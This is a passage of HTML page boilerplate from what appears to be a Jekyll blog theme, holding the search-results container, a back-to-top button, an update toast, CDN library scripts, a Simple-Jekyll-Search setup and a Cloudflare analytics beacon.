</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center d-none">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->


















    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- JavaScripts -->
    <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->




  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.11/dayjs.min.js,npm/dayjs@1.11.11/locale/en.min.js,npm/dayjs@1.11.11/plugin/relativeTime.min.js,npm/dayjs@1.11.11/plugin/localizedFormat.min.js,npm/tocbot@4.27.20/dist/tocbot.min.js"></script>






<script src="/assets/js/dist/post.min.js"></script>



<!-- Pageviews -->

  

  







    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>SimpleJekyllSearch({
    searchInput: document.getElementById('search-input'),
    resultsContainer: document.getElementById('search-results'),
    json: '/assets/js/data/search.json',
    searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
    noResultsText: '<p class="mt-5">Oops! No results found.</p>',
    templateMiddleware: function(prop, value, template) {
      if (prop === 'categories') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
        }
      }

      if (prop === 'tags') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
        }
      }
    }
  });
</script>

  <!-- Cloudflare Pages Analytics --><script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "5a0d6439923d4c8582697636643f8128"}'></script><!-- Cloudflare Pages Analytics --></body>
</html>

